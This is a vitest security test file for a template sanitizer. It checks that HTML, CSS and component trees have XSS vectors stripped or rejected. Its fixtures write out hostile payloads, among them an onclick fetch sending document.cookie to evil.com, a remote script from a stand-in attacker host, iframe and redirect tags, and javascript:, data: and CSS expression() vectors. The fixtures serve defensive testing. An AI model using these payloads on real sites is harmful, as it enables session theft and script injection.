import { describe, it, expect } from 'vitest';
import {
  sanitizeHtmlContent,
  sanitizeCssContent,
  checkAndSanitizeComponentTree,
} from '@/features/collections/utils/template-sanitizer.util';
import type { TemplateValidationError } from '@/features/collections/types/template.types';

describe('Security Negative Assertions: Template Sanitizer', () => {
  describe('HTML Content Sanitization (DOMPurify & Vector Stripping)', () => {
    it('returns empty string for falsy/empty HTML inputs', () => {
      expect(sanitizeHtmlContent('')).toBe('');
      expect(sanitizeHtmlContent(null as unknown as string)).toBe('');
      expect(sanitizeHtmlContent(undefined as unknown as string)).toBe('');
    });

    it('strips inline <script> tags and embedded payloads', () => {
      const malicious = '<div>Safe text<script>alert("XSS")</script></div>';
      const clean = sanitizeHtmlContent(malicious);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('alert("XSS")');
      expect(clean).toContain('Safe text');
    });

    it('strips <script src="..."> remote execution tags', () => {
      const malicious =
        '<p>Article</p><script src="https://evil-attacker.com/payload.js"></script>';
      const clean = sanitizeHtmlContent(malicious);
      expect(clean).not.toContain('evil-attacker.com');
      expect(clean).not.toContain('<script');
      expect(clean).toContain('<p>Article</p>');
    });

    it('strips case-varied and malformed script tags like <sCrIpt>', () => {
      const malicious =
        '<div><sCrIpt>window.location="http://evil.com"</ScRiPt></div>';
      const clean = sanitizeHtmlContent(malicious);
      expect(clean).not.toContain('window.location');
      expect(clean).not.toContain('evil.com');
    });

    it('strips inline event handlers (onerror, onclick, onload, onmouseover, onfocus, onblur)', () => {
      const maliciousImg =
        '<img src="invalid-url.jpg" onerror="alert(document.cookie)" />';
      expect(sanitizeHtmlContent(maliciousImg)).not.toContain('onerror');
      expect(sanitizeHtmlContent(maliciousImg)).not.toContain('alert');

      const maliciousButton =
        '<button onclick="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">Click</button>';
      expect(sanitizeHtmlContent(maliciousButton)).not.toContain('onclick');
      expect(sanitizeHtmlContent(maliciousButton)).not.toContain('fetch');

      const maliciousDiv =
        '<div onmouseover="alert(1)" onfocus="alert(2)" onblur="alert(3)">Content</div>';
      const sanitizedDiv = sanitizeHtmlContent(maliciousDiv);
      expect(sanitizedDiv).not.toContain('onmouseover');
      expect(sanitizedDiv).not.toContain('onfocus');
      expect(sanitizedDiv).not.toContain('onblur');
      expect(sanitizedDiv).toContain('Content');
    });

    it('strips forbidden embedded objects, frames, and links (<iframe, <object, <embed, <applet, <base, <meta, <link>)', () => {
      const payloads = [
        '<iframe src="https://evil.com/phishing"></iframe>',
        '<object data="exploit.swf"></object>',
        '<embed src="exploit.swf"></embed>',
        '<applet code="Malicious.class"></applet>',
        '<base href="https://evil.com/">',
        '<meta http-equiv="refresh" content="0;url=https://evil.com">',
        '<link rel="stylesheet" href="https://evil.com/leak.css">',
      ];

      for (const payload of payloads) {
        const clean = sanitizeHtmlContent(payload);
        expect(clean).not.toContain('<iframe');
        expect(clean).not.toContain('<object');
        expect(clean).not.toContain('<embed');
        expect(clean).not.toContain('<applet');
        expect(clean).not.toContain('<base');
        expect(clean).not.toContain('<meta');
        expect(clean).not.toContain('<link');
      }
    });

    it('strips javascript: protocol pseudo-URLs in attributes', () => {
      const linkPayload = '<a href="javascript:alert(\'hacked\')">Click me</a>';
      const clean = sanitizeHtmlContent(linkPayload);
      expect(clean).not.toContain('javascript:alert');
    });

    it('preserves legitimate safe HTML markup and data attributes', () => {
      const safe =
        '<div class="card p-4" data-section-id="sec-101"><h2 class="text-xl">Title</h2><p>Description</p></div>';
      const clean = sanitizeHtmlContent(safe);
      expect(clean).toContain('data-section-id="sec-101"');
      expect(clean).toContain('Title');
      expect(clean).toContain('Description');
    });
  });

  describe('CSS Content Sanitization', () => {
    it('returns empty string for falsy/empty CSS inputs', () => {
      expect(sanitizeCssContent('')).toBe('');
      expect(sanitizeCssContent(null as unknown as string)).toBe('');
      expect(sanitizeCssContent(undefined as unknown as string)).toBe('');
    });

    it('strips legacy IE CSS expression() vector exploits', () => {
      const malicious =
        'body { width: expression(alert("XSS")); height: 100px; }';
      const clean = sanitizeCssContent(malicious);
      expect(clean).not.toContain('expression');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('height: 100px;');
    });

    it('strips javascript: URL protocol inside CSS rules', () => {
      const malicious =
        'div { background-image: url(javascript:alert("CSS-XSS")); color: #333; }';
      const clean = sanitizeCssContent(malicious);
      expect(clean).not.toContain('javascript:');
      expect(clean).toContain('color: #333;');
    });

    it('strips behavior: HTC vector exploits', () => {
      const malicious = '.box { behavior: url(script.htc); margin: 0; }';
      const clean = sanitizeCssContent(malicious);
      expect(clean).not.toContain('behavior:');
      expect(clean).toContain('margin: 0;');
    });

    it('preserves clean and standard CSS styling rules', () => {
      const safe =
        '.header { display: flex; justify-content: space-between; background: #1e293b; color: #ffffff; }';
      const clean = sanitizeCssContent(safe);
      expect(clean).toBe(safe);
    });
  });

  describe('Dynamic Component Tree Security Assertions', () => {
    it('handles null and primitive non-object nodes gracefully', () => {
      const errors: TemplateValidationError[] = [];
      expect(checkAndSanitizeComponentTree(null, 'root', errors)).toBeNull();
      expect(
        checkAndSanitizeComponentTree(undefined, 'root', errors),
      ).toBeNull();
      expect(checkAndSanitizeComponentTree(12345, 'root', errors)).toBeNull();
      expect(errors).toHaveLength(0);
    });

    it('sanitizes pure string nodes via HTML sanitization', () => {
      const errors: TemplateValidationError[] = [];
      const node = 'Hello <b>World</b><script>alert(1)</script>';
      const result = checkAndSanitizeComponentTree(node, 'root', errors);
      expect(result).toBe('Hello <b>World</b>');
      expect(errors).toHaveLength(0);
    });

    it('rejects forbidden tags with explicit security violation errors', () => {
      const errors: TemplateValidationError[] = [];
      const maliciousNode = {
        tagName: 'iframe',
        attributes: { src: 'https://evil.com/embed' },
      };

      const result = checkAndSanitizeComponentTree(
        maliciousNode,
        'root.components[0]',
        errors,
      );
      expect(result).toBeNull();
      expect(errors).toHaveLength(1);
      expect(errors[0]?.path).toBe('root.components[0].tagName');
      expect(errors[0]?.message).toContain(
        'Security violation: Forbidden tag <iframe',
      );
    });

    it('rejects inline event handlers on components and strips them', () => {
      const errors: TemplateValidationError[] = [];
      const maliciousNode = {
        tagName: 'div',
        attributes: {
          id: 'valid-id',
          onclick: 'alert("pwned")',
          onmouseenter: 'doEvil()',
        },
      };

      const result = checkAndSanitizeComponentTree(
        maliciousNode,
        'root.components[1]',
        errors,
      ) as Record<string, unknown>;
      expect(result).not.toBeNull();
      expect(errors).toHaveLength(2);
      expect(errors[0]?.message).toContain(
        'Inline JavaScript event handler "onclick" is rejected',
      );
      expect(errors[1]?.message).toContain(
        'Inline JavaScript event handler "onmouseenter" is rejected',
      );
      expect(result.attributes).toEqual({ id: 'valid-id' });
    });

    it('rejects dangerous URL schemes in attributes (javascript:, vbscript:, data:text/html)', () => {
      const errors: TemplateValidationError[] = [];
      const maliciousNode = {
        tagName: 'a',
        attributes: {
          href: 'javascript:alert(1)',
          'data-src':
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
          title: 'Safe Link',
        },
      };

      const result = checkAndSanitizeComponentTree(
        maliciousNode,
        'root.components[2]',
        errors,
      ) as Record<string, unknown>;
      expect(result).not.toBeNull();
      expect(errors).toHaveLength(2);
      expect(errors[0]?.message).toContain(
        'Disallowed URL scheme "javascript:alert(1)" is rejected',
      );
      expect(errors[1]?.message).toContain('Disallowed URL scheme');
      expect(result.attributes).toEqual({ title: 'Safe Link' });
    });

    it('recursively traverses and sanitizes nested child component structures', () => {
      const errors: TemplateValidationError[] = [];
      const nestedTree = {
        tagName: 'section',
        attributes: { class: 'hero' },
        content: 'Clean text <script>evil()</script>',
        components: [
          {
            tagName: 'div',
            attributes: { class: 'container' },
            components: [
              'Direct text node <img src="x" onerror="evil()"/>',
              {
                tagName: 'script',
                attributes: {},
              },
              {
                tagName: 'p',
                attributes: { class: 'lead' },
                content: 'Safe paragraph',
              },
            ],
          },
        ],
      };

      const result = checkAndSanitizeComponentTree(
        nestedTree,
        'root',
        errors,
      ) as Record<string, unknown>;
      expect(result).not.toBeNull();
      expect(result.content).toBe('Clean text ');

      // The script tag child should be rejected with an error
      expect(errors).toHaveLength(1);
      expect(errors[0]?.message).toContain('Forbidden tag <script>');

      const sectionComponents = result.components as Array<
        Record<string, unknown>
      >;
      expect(sectionComponents).toHaveLength(1);

      const divNode = sectionComponents[0];
      const divComponents = divNode?.components as Array<
        Record<string, unknown>
      >;
      // Expect 2 children: sanitized string child + safe p tag child (script removed)
      expect(divComponents).toHaveLength(2);
      expect(divComponents[0]).toEqual({
        type: 'text',
        content: 'Direct text node <img src="x">',
      });
      expect(divComponents[1]).toMatchObject({
        tagName: 'p',
        content: 'Safe paragraph',
      });
    });

    it('sanitizes string components property', () => {
      const errors: TemplateValidationError[] = [];
      const node = {
        tagName: 'div',
        components: '<span>Simple text</span><script>alert(1)</script>',
      };

      const result = checkAndSanitizeComponentTree(
        node,
        'root',
        errors,
      ) as Record<string, unknown>;
      expect(result.components).toBe('<span>Simple text</span>');
    });
  });
});
